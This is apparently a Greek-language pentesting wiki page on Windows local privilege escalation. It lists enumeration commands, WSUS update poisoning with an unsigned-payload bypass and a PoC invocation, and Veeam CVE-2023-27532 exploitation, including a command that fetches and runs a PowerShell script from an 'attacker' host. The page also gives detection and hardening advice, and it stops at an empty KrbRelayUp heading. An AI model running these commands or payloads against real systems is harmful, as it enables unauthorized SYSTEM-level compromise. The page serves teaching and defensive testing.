# Κλιμάκωση τοπικών προνομίων στα Windows

{{#include ../../banners/hacktricks-training.md}}

### **Το καλύτερο εργαλείο για την αναζήτηση διανυσμάτων κλιμάκωσης τοπικών προνομίων στα Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

Αυτή η σελίδα συγκεντρώνει γενικές μεθοδολογίες κλιμάκωσης προνομίων στα Windows από αρκετούς θεμελιώδεις οδηγούς.<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> Η πρακτική ροή απαρίθμησης βασίζεται επίσης σε εργαστήρια και λίστες ελέγχου της κοινότητας.<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> Το ιστορικό υλικό επιθέσεων περιλαμβάνει την παρουσίαση του DerbyCon για την κλιμάκωση προνομίων στα Windows.<sup>[[5]](#references)</sup>

## Βασική θεωρία των Windows

### Access Tokens

**Αν δεν γνωρίζετε τι είναι τα access tokens των Windows, διαβάστε την παρακάτω σελίδα πριν συνεχίσετε:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Για περισσότερες πληροφορίες σχετικά με τα ACLs - DACLs/SACLs/ACEs, δείτε την παρακάτω σελίδα:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Επίπεδα ακεραιότητας

**Αν δεν γνωρίζετε τι είναι τα επίπεδα ακεραιότητας στα Windows, διαβάστε την παρακάτω σελίδα πριν συνεχίσετε:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Έλεγχοι ασφαλείας των Windows

Στα Windows υπάρχουν διάφοροι παράγοντες που θα μπορούσαν να **σας εμποδίσουν να απαριθμήσετε το σύστημα**, να εκτελέσετε εκτελέσιμα αρχεία ή ακόμα και να **εντοπίσουν τις δραστηριότητές σας**. Πριν ξεκινήσετε την απαρίθμηση για κλιμάκωση προνομίων, θα πρέπει να **διαβάσετε** την παρακάτω **σελίδα** και να **απαριθμήσετε** όλους αυτούς τους **μηχανισμούς άμυνας**:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

Η φυσική πρόσβαση μπορεί επίσης να μετατρέψει μια offline επεξεργασία του UEFI NVRAM σε αλυσίδα επιθέσεων pre-boot DMA και τροποποίησης μνήμης των Windows `SYSTEM`:

{{#ref}}
../../hardware-physical-access/firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

### Προστασία διαχειριστή / σιωπηλή ανύψωση μέσω UIAccess

Οι διεργασίες UIAccess που εκκινούνται μέσω του `RAiLaunchAdminProcess` μπορούν να αξιοποιηθούν για πρόσβαση σε High IL χωρίς προτροπές, όταν παρακάμπτονται οι έλεγχοι AppInfo secure-path. Δείτε εδώ την ειδική ροή εργασίας παράκαμψης UIAccess/Admin Protection:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Η διάδοση ρυθμίσεων μητρώου προσβασιμότητας στο Secure Desktop μπορεί να αξιοποιηθεί για αυθαίρετη εγγραφή στο μητρώο ως SYSTEM (RegPwn):<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

Οι πρόσφατες εκδόσεις των Windows εισήγαγαν επίσης ένα μονοπάτι LPE μέσω **SMB σε αυθαίρετη θύρα**, όπου γίνεται ανάκλαση ενός τοπικού NTLM authentication με αυξημένα προνόμια μέσω μιας επαναχρησιμοποιημένης σύνδεσης SMB TCP:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## Πληροφορίες συστήματος

### Απαρίθμηση πληροφοριών έκδοσης

Ελέγξτε αν η έκδοση των Windows έχει γνωστές ευπάθειες (ελέγξτε επίσης τις εφαρμοσμένες ενημερώσεις κώδικα).

```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```

### Exploits έκδοσης

Αυτός ο [ιστότοπος](https://msrc.microsoft.com/update-guide/vulnerability) είναι χρήσιμος για την αναζήτηση λεπτομερών πληροφοριών σχετικά με ευπάθειες ασφαλείας της Microsoft. Αυτή η βάση δεδομένων περιέχει περισσότερες από 4.700 ευπάθειες ασφαλείας, δείχνοντας τη **τεράστια επιφάνεια επίθεσης** που παρουσιάζει ένα περιβάλλον Windows.

**Στο σύστημα**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) — καταγράφει το build του OS, τις εγκατεστημένες ενημερώσεις και πιθανούς σχετικούς υποψηφίους από advisories· επαληθεύστε το ακριβές προϊόν και τις ενημερώσεις που τις αντικαθιστούν προτού θεωρήσετε ότι ένα αποτέλεσμα εφαρμόζεται.

Για ένα local exploit που αφορά συγκεκριμένη έκδοση, ελέγξτε τόσο την **αρχιτεκτονική της διεργασίας που εκτελείται** όσο και την αρχιτεκτονική του OS. Σε Windows 64-bit, μια διεργασία 32-bit υπόκειται στην [ανακατεύθυνση συστήματος αρχείων WOW64](https://learn.microsoft.com/en-us/windows/win32/winprog64/file-system-redirector): το `%windir%\System32` συνήθως παραπέμπει στον κατάλογο συστήματος 32-bit, ενώ το `%windir%\Sysnative` επιτρέπει σε αυτήν τη διεργασία να έχει πρόσβαση στον εγγενή κατάλογο συστήματος. Το alias δεν είναι διαθέσιμο σε διεργασία 64-bit. Ένα build του OS ή η απουσία μιας ενημέρωσης KB δεν αποδεικνύει ότι είναι δυνατή η εκμετάλλευση· συγκρίνετε το build που εκτελείται, τις εγκατεστημένες ενημερώσεις ή τις ενημερώσεις που τις αντικαθιστούν, την αρχιτεκτονική της διεργασίας και τις προϋποθέσεις του exploit με το [δελτίο ασφαλείας της Microsoft](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032) για το συγκεκριμένο ζήτημα.

**Τοπικά με πληροφορίες συστήματος**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github repos με exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Περιβάλλον

Υπάρχουν αποθηκευμένα διαπιστευτήρια ή Juicy info στις μεταβλητές περιβάλλοντος;

```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```

### Ιστορικό PowerShell

```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

### Αρχεία Transcript του PowerShell

Μπορείτε να μάθετε πώς να το ενεργοποιήσετε στο [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)

```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```

`C:\Transcripts` είναι μόνο ένα παράδειγμα. Η [πολιτική καταγραφής PowerShell σε αρχεία transcript](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_group_policy_settings#turn-on-powershell-transcription) συνήθως αποθηκεύει τα αρχεία στον φάκελο Documents κάθε χρήστη, αλλά μια ρύθμιση `OutputDirectory` ή η εντολή `Start-Transcript -OutputDirectory` μπορεί να τα ανακατευθύνει σε κοινόχρηστο ή κρυφό φάκελο. Ελέγξτε την ενεργή διαδρομή εξόδου και τα ACL του αρχείου πριν εξετάσετε ένα transcript: μπορεί να περιέχει ορίσματα εντολών και έξοδο, συμπεριλαμβανομένων διαπιστευτηρίων. Ένα transcript με δικαίωμα ανάγνωσης αποτελεί ένδειξη μόνο αν το περιεχόμενό του αποκαλύπτει έναν αξιοποιήσιμο λογαριασμό με υψηλότερα προνόμια και ο λογαριασμός αυτός μπορεί να συνδεθεί στο σχετικό περιβάλλον.

### PowerShell Module Logging

Καταγράφονται λεπτομέρειες των εκτελέσεων του pipeline του PowerShell, συμπεριλαμβανομένων των εντολών που εκτελέστηκαν, των κλήσεων εντολών και τμημάτων των scripts. Ωστόσο, ενδέχεται να μην καταγράφονται πλήρεις λεπτομέρειες εκτέλεσης και αποτελέσματα εξόδου.

Για να το ενεργοποιήσετε, ακολουθήστε τις οδηγίες στην ενότητα «Αρχεία transcript» της τεκμηρίωσης και επιλέξτε **«Module Logging»** αντί για **«Powershell Transcription»**.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```

Για να δείτε τα τελευταία 15 συμβάντα από τα αρχεία καταγραφής του PowersShell, μπορείτε να εκτελέσετε:

```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```

### PowerShell **Script Block Logging**

Καταγράφεται πλήρης δραστηριότητα και όλο το περιεχόμενο της εκτέλεσης του script, διασφαλίζοντας ότι κάθε block κώδικα τεκμηριώνεται καθώς εκτελείται. Αυτή η διαδικασία διατηρεί ένα ολοκληρωμένο ίχνος ελέγχου για κάθε δραστηριότητα, χρήσιμο για την εγκληματολογική ανάλυση και τη διερεύνηση κακόβουλης συμπεριφοράς. Με την τεκμηρίωση όλης της δραστηριότητας κατά την εκτέλεσή της, παρέχονται λεπτομερείς πληροφορίες για τη διαδικασία.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```

Τα συμβάντα καταγραφής για το Script Block μπορούν να εντοπιστούν στην Προβολή συμβάντων των Windows, στη διαδρομή: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Για να δείτε τα τελευταία 20 συμβάντα, μπορείτε να χρησιμοποιήσετε:

```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```

### Ρυθμίσεις Internet

```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```

### Μονάδες δίσκου

```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

## WSUS

Ένα HTTP endpoint WSUS αποτελεί ένδειξη για διερεύνηση πιθανής παρεμβολής στα metadata ενημερώσεων. Η εκμετάλλευση εξαρτάται επίσης από το αν ο client χρησιμοποιεί αυτόν τον WSUS server, αν ένας attacker μπορεί να υποκλέψει ή να ελέγξει την κίνησή του, καθώς και από τις πολιτικές εμπιστοσύνης και εγκατάστασης ενημερώσεων του client. Το URL από μόνο του δεν αποδεικνύει δυνατότητα εκτέλεσης κώδικα. [Η Microsoft συνιστά TLS για τα metadata του WSUS](https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/deploy/2-configure-wsus).

Ξεκινάτε ελέγχοντας αν το δίκτυο χρησιμοποιεί ενημέρωση WSUS χωρίς SSL, εκτελώντας την παρακάτω εντολή στο cmd:

```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```

Ή τα παρακάτω σε PowerShell:

```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```

Αν λάβεις μια απάντηση όπως μία από αυτές:

```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
      WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```

Και αν τα `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` ή `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` ισούνται με `1`.

Όταν το `UseWUServer` είναι `1`, το Windows Update χρησιμοποιεί την καθορισμένη υπηρεσία intranet. Αυτό επιβεβαιώνει μια προϋπόθεση για τη διαδρομή υποκλοπής HTTP, αλλά δεν αποδεικνύει ότι είναι εφικτή η υποκλοπή, η αποδοχή κακόβουλων ενημερώσεων ή η εγκατάσταση με αυξημένα δικαιώματα. Όταν είναι `0`, το συγκεκριμένο διαμορφωμένο τελικό σημείο WSUS δεν επιλέγεται από αυτή την πολιτική.

Για να εκμεταλλευτείτε αυτά τα vulnerabilities, μπορείτε να χρησιμοποιήσετε εργαλεία όπως τα [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus)- Πρόκειται για weaponized scripts επιθέσεων MiTM για την εισαγωγή «ψεύτικων» ενημερώσεων σε κίνηση WSUS χωρίς SSL.

Διαβάστε την έρευνα εδώ:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Διαβάστε την πλήρη αναφορά εδώ**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).<sup>[[33]](#references)</sup>\
Βασικά, αυτό είναι το κενό που εκμεταλλεύεται αυτό το bug:

> Αν έχουμε τη δυνατότητα να τροποποιήσουμε τον proxy του τοπικού χρήστη μας και το Windows Updates χρησιμοποιεί τον proxy που έχει διαμορφωθεί στις ρυθμίσεις του Internet Explorer, τότε μπορούμε να εκτελέσουμε το [PyWSUS](https://github.com/GoSecure/pywsus) τοπικά, να υποκλέψουμε τη δική μας κίνηση και να εκτελέσουμε κώδικα με αυξημένα δικαιώματα στο σύστημά μας.
>
> Επιπλέον, καθώς η υπηρεσία WSUS χρησιμοποιεί τις ρυθμίσεις του τρέχοντος χρήστη, χρησιμοποιεί και το certificate store του. Αν δημιουργήσουμε ένα self-signed certificate για το hostname του WSUS και προσθέσουμε αυτό το certificate στο certificate store του τρέχοντος χρήστη, θα μπορούμε να υποκλέψουμε κίνηση WSUS τόσο μέσω HTTP όσο και μέσω HTTPS. Το WSUS δεν χρησιμοποιεί μηχανισμούς τύπου HSTS για να υλοποιήσει επικύρωση εμπιστοσύνης τύπου trust-on-first-use για το certificate. Αν το certificate που παρουσιάζεται είναι έμπιστο για τον χρήστη και έχει το σωστό hostname, η υπηρεσία θα το αποδεχτεί.

Μπορείτε να εκμεταλλευτείτε αυτό το vulnerability χρησιμοποιώντας το εργαλείο [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (μόλις κυκλοφορήσει).

### Ενημερώσεις WSUS υπό τον έλεγχο διαχειριστή

Υπάρχει ξεχωριστή διαδρομή όταν η τρέχουσα ταυτότητα μπορεί να **δημοσιεύει και να εγκρίνει** ενημερώσεις σε έναν διακομιστή WSUS. Ελέγξτε την πραγματική συμμετοχή στην ομάδα `WSUS Administrators` του διακομιστή και τυχόν εκχωρημένα δικαιώματα WSUS, και κατόπιν εντοπίστε την ομάδα υπολογιστών-πελατών που θα λάβει μια εγκεκριμένη ενημέρωση. Η [Microsoft απαιτεί δικαιώματα WSUS Administrator για την έγκριση ενημερώσεων](https://learn.microsoft.com/en-us/powershell/module/updateservices/approve-wsusupdate) και [τεκμηριώνει τη σχέση εμπιστοσύνης δημοσίευσης](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/bb902479%28v%3Dvs.85%29): οι clients πρέπει να εμπιστεύονται το signing certificate που χρησιμοποιείται για περιεχόμενο που δημοσιεύεται τοπικά. Επιβεβαιώστε ότι η υποψήφια ενημέρωση είναι υπογεγραμμένη και γίνεται αποδεκτή, αφορά τον στόχο και εγκαθίσταται σε περιβάλλον με περισσότερα δικαιώματα, προτού θεωρήσετε ότι πρόκειται για διαδρομή κλιμάκωσης δικαιωμάτων. Μια τιμή HTTP `WUServer` ή ένα όνομα ομάδας από μόνα τους δεν αποδεικνύουν ότι ισχύουν αυτές οι προϋποθέσεις.

### Κατάχρηση προσαρμοσμένων ενημερώσεων SUSDB: unsigned payloads μέσω `.txt`/`.esd`

Πρόκειται για διαφορετική αστοχία ορίου εμπιστοσύνης από την υποκλοπή σύνδεσης HTTP WSUS: η απαραίτητη προϋπόθεση είναι επαρκής πρόσβαση στις **stored procedures της βάσης δεδομένων WSUS (`SUSDB`)** για τη δημοσίευση και έγκριση μιας προσαρμοσμένης ενημέρωσης. Μια πρακτική αρχική διαδρομή είναι η αναμετάδοση ενός upstream λογαριασμού υπολογιστή WSUS σε ξεχωριστό διακομιστή MSSQL που φιλοξενεί το `SUSDB`. Η ακριβής προϋπόθεση εξαρτάται από την εγκατάσταση, οπότε πρώτα απαριθμήστε τα δικαιώματα `EXECUTE` αντί να υποθέσετε ότι απαιτούνται δικαιώματα διαχειριστή SQL.<sup>[[38]](#references)[[39]](#references)</sup>

Για τη ξεχωριστή διαδρομή επίθεσης που αναμεταδίδει τον έλεγχο ταυτότητας WSUS client από HTTP/8530 σε LDAP, SMB ή AD CS, δείτε [Κατάχρηση WSUS HTTP για NTLM relay](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#abusing-wsus-http-8530-for-ntlm-relay-to-ldapsmbad-cs-esc8).

#### Δημιουργία, στόχευση και έγκριση της ενημέρωσης

Η ροή εργασίας προσαρμοσμένων ενημερώσεων χρησιμοποιεί τις νόμιμες διαδικασίες WSUS ως περιορισμένο API δημοσίευσης. Οι σημαντικές μεταβάσεις κατάστασης είναι οι εξής:<sup>[[38]](#references)</sup>

| Στάδιο | Σχετικές stored procedures |
| --- | --- |
| Εισαγωγή μεταδεδομένων ενημέρωσης | `spImportUpdate` |
| Αποθήκευση XML fragments προαπαιτούμενων, τοπικοποιημένων και εκτεταμένων δεδομένων | `spSaveXMLFragment` |
| Συσχέτιση του digest του περιεχομένου με URL που ελέγχεται από τον επιτιθέμενο | `spSetBatchURL` |
| Απαρίθμηση/δημιουργία ομάδας υπολογιστών και προσθήκη του client | `spGetAllTargetGroups`, `spCreateTargetGroup`, `spGetComputerTargetByName`, `spAddComputerToTargetGroup` |
| Έγκριση εγκατάστασης για αυτή την ομάδα | `spDeployUpdate` με `@actionID = 0` και `@isAssigned = 1` |

Το όνομα αρχείου, τα digests, το μέγεθος και το handler `CommandLineInstallation` πρέπει να συμφωνούν σε όλα τα εισαγόμενα metadata/fragments. Αφού οριστούν το URL περιεχομένου και η ομάδα-στόχος, η τελική έγκριση μοιάζει με την παρακάτω. Χρησιμοποιήστε νέα αναγνωριστικά ενημέρωσης, ομάδας και ανάπτυξης αντί να επαναχρησιμοποιήσετε τα ενδεικτικά GUID.<sup>[[38]](#references)[[39]](#references)</sup>

```sql
EXEC spDeployUpdate
  @updateID = '<update-guid>', @revisionNumber = 1,
  @actionID = 0, @targetGroupID = '<group-guid>',
  @isAssigned = 1, @deadline = '<yyyy-mm-dd hh:mm:ss>',
  @adminName = 'Administrator';
```

#### Παράκαμψη υπογραφής μέσω επέκτασης αρχείου

Το WSUS συνήθως απορρίπτει αυθαίρετο μη υπογεγραμμένο εκτελέσιμο περιεχόμενο. Ωστόσο, στο `C:\Program Files\Update Services\Services\Microsoft.UpdateServices.ContentSyncAgent.dll`, η διαδρομή .NET `VerifyFile` ορίζει τη σημαία ελέγχου πιστοποιητικού σε false όταν το όνομα αρχείου που παρέχεται τελειώνει σε `.txt` ή `.esd`. Έτσι, παραλείπεται η `CheckCertificateSignature` χωρίς να επιβεβαιωθεί πρώτα ότι τα bytes είναι κείμενο ή νόμιμη εικόνα ESD. Επομένως, ένα αμετάβλητο PE με όνομα, για παράδειγμα, `payload.exe.txt` μπορεί να περάσει την επαλήθευση περιεχομένου και στη συνέχεια να εκκινηθεί από τον χειριστή εγκατάστασης της ενημέρωσης μέσω της γραμμής εντολών. Πρόκειται για σφάλμα σύγχυσης πολιτικής και τύπου, όχι για πλαστογράφηση υπογραφής.<sup>[[39]](#references)</sup>

```csharp
bool checkSignature = true;
if (fileName.EndsWith(".txt") || fileName.EndsWith(".esd"))
    checkSignature = false;
if (checkSignature)
    CheckCertificateSignature(/* downloaded file */);
```

#### Staging συμβατό με BITS και αυτοματοποίηση

Η κλήση του `spDeployUpdate` κάνει το WSUS να ανακτήσει το καταχωρισμένο περιεχόμενο. Η προέλευση πρέπει να ικανοποιεί τις απαιτήσεις HTTP του BITS: δεν αρκεί να είναι προσβάσιμο ένα URL, καθώς η μεταφορά χρησιμοποιεί αρχική ροή `HEAD`/`GET` και αιτήματα byte-range. Ένας server χωρίς υποστήριξη Range προκαλεί συμβάν συγχρονισμού WSUS `EventId=364`, το οποίο αναφέρει ότι το BITS απαιτεί την κεφαλίδα πρωτοκόλλου Range.<sup>[[39]](#references)</sup>

Το ερευνητικό PoC [NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious) δημιουργεί το SQL που απαιτείται για την αλυσίδα import/fragment/URL/group/deployment, περιλαμβάνει έναν τροποποιημένο MSSQL client για την εκτέλεσή του και παρέχει το `BitsWebServer.py` για το staging περιεχομένου. Μια ελάχιστη εντολή για εξουσιοδοτημένο lab είναι:<sup>[[40]](#references)</sup>

```bash
python3 NotWSUSpicious.py \
  --wsusHostname wsus.lab.local \
  --updateFileURL 'http://payload.lab.local:8443/payload.exe.txt' \
  --updateName SecurityUpdate \
  --updateFilePath /payloads/payload.exe.txt \
  --updateArguments '' \
  --computerGroup TestGroup \
  --targetComputer workstation.lab.local
python3 BitsWebServer.py
```

#### Μη επιτηρούμενη εκτέλεση και persistence μέσω επαναλήψεων

Η αλληλεπίδραση από την πλευρά του client εξαρτάται από την πολιτική. Η επιλογή `4 - Auto download and schedule install` στη ρύθμιση `Computer Configuration > Administrative Templates > Windows Components > Windows Update > Configure Automatic Updates` κάνει λήψη και εγκατάσταση μιας εγκεκριμένης ενημέρωσης στο προγραμματισμένο χρονοδιάγραμμα, χωρίς να χρειάζεται να την επιλέξει χειροκίνητα ο χρήστης. Κατά τη δοκιμή, ένα payload του οποίου η ενημέρωση παρέμενε αποτυχημένη/ανολοκλήρωτη προσφερόταν ξανά αμέσως μετά την έξοδο της διεργασίας callback, επομένως η συμπεριφορά επανάληψης μπορεί να γίνει persistence μέσω επαναλαμβανόμενης εκτέλεσης· είναι θορυβώδης, επειδή ο client εμφανίζει κατάσταση αποτυχίας ενημέρωσης.<sup>[[39]](#references)</sup>

#### Άξονες ελέγχου και ενίσχυσης της ασφάλειας

Χρήσιμοι άξονες ελέγχου από την πλευρά του server και του client για αυτήν την αλυσίδα είναι:<sup>[[39]](#references)</sup>

- Ελέγξτε την εκτέλεση των `spCreateTargetGroup`, `spSetBatchURL` και `spDeployUpdate` στη `SUSDB`· διερευνήστε νέες ομάδες στόχευσης, εξωτερικές πηγές περιεχομένου, payload ενημερώσεων `.txt`/`.esd` και deployments από μη αναμενόμενους principals (ειδικά λογαριασμούς που δεν είναι λογαριασμοί υπολογιστών).
- Εξετάστε το `C:\Program Files\Update Services\LogFiles` για τα `ContentSyncAgent`, `FileVerified`, το ανορθόγραφο `FileVerficationFailed` και το `EventId=364`· συσχετίστε την επαλήθευση με την επέκταση του payload και τη μαγική υπογραφή του περιεχομένου, αντί να εμπιστεύεστε την κατάληξη.
- Αναζητήστε επανειλημμένες αποτυχίες/επαναλήψεις εγκατάστασης του Windows Update, καθώς και εκτέλεση PE ή μη αναμενόμενη δραστηριότητα child process/δικτύου από περιεχόμενο με ονόματα `.txt` ή `.esd`.
- Όπου υποστηρίζεται, απαιτήστε Extended Protection for Authentication στην υπηρεσία βάσης δεδομένων και περιορίστε την πρόσβαση της βάσης δεδομένων μέσω δικτύου στον WSUS server και σε εξουσιοδοτημένα διαχειριστικά συστήματα. Περιορίστε στο ελάχιστο και ελέγχετε τα δικαιώματα `EXECUTE` στις διαδικασίες custom-update.

## Εργαλεία αυτόματης ενημέρωσης τρίτων και Agent IPC (local privesc)

Πολλοί enterprise agents εκθέτουν μια επιφάνεια IPC στο localhost και ένα προνομιακό κανάλι ενημέρωσης. Αν η διαδικασία enrollment μπορεί να εξαναγκαστεί να συνδεθεί σε server του attacker και το updater εμπιστεύεται μια rogue root CA ή ανεπαρκείς ελέγχους signer, ένας τοπικός χρήστης μπορεί να παραδώσει ένα κακόβουλο MSI, το οποίο εγκαθιστά η υπηρεσία SYSTEM. Δείτε μια γενικευμένη τεχνική (βασισμένη στην αλυσίδα Netskope stAgentSvc – CVE-2025-0309) εδώ:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM μέσω TCP 9401)

Τα Veeam Backup & Replication και Cloud Connect χρησιμοποιούν μια βασική υπηρεσία backup στην **TCP/9401 από προεπιλογή**. Η [συμβουλευτική ανακοίνωση της Veeam](https://www.veeam.com/kb4424) περιγράφει μη αυθεντικοποιημένη αποκάλυψη διαπιστευτηρίων της κρυπτογραφημένης βάσης δεδομένων ρυθμίσεων εντός της περιμέτρου του δικτύου backup· ξεχωριστό δημόσιο PoC παρουσιάζει μια διαδρομή εκτέλεσης εντολών ως **NT AUTHORITY\SYSTEM**.<sup>[[12]](#references)</sup> Η υπηρεσία ενδέχεται να κάνει bind σε διεύθυνση πέρα από το localhost, επομένως ελέγξτε την πραγματική διεύθυνση και το PID της.

- **Αναγνώριση**: επιβεβαιώστε ότι η TCP/9401 αντιστοιχεί στο `Veeam.Backup.Service.exe` και, στη συνέχεια, ελέγξτε το εγκατεστημένο προϊόν και τα patch metadata. Οι εντολές `netstat -ano | findstr 9401` και `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion` είναι ενδείξεις, όχι πλήρης έλεγχος patch.
- **Ελάχιστες διορθωμένες εκδόσεις**: Η Veeam αναφέρει τις **11a build 11.0.1.1261 P20230227** και **12 build 12.0.0.1420 P20230223** ως τις πρώτες διορθωμένες εκδόσεις· επηρεάζονται οι παλαιότερες εκδόσεις. Μια τετραμερής έκδοση αρχείου από μόνη της δεν μπορεί να διακρίνει ένα μη διορθωμένο base build από ένα μεταγενέστερο patch στους ίδιους αριθμούς build. Πριν θεωρήσετε διορθωμένο ένα build κοντά στο όριο, επαληθεύστε το αναγνωριστικό patch στο [ιστορικό build του κατασκευαστή](https://www.veeam.com/kb2680).
- **Εκμετάλλευση**: τοποθετήστε ένα PoC όπως το `VeeamHax.exe`, μαζί με τα απαιτούμενα Veeam DLLs, στον ίδιο κατάλογο και, στη συνέχεια, ενεργοποιήστε ένα SYSTEM payload μέσω του local socket:

```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```

Το αναφερόμενο PoC επιδεικνύει εκτέλεση εντολών ως SYSTEM όταν ισχύουν οι πρόσθετες προϋποθέσεις του· η συμβουλευτική ανακοίνωση του προμηθευτή περιγράφει το ζήτημα αποκάλυψης διαπιστευτηρίων.
## KrbRelayUp

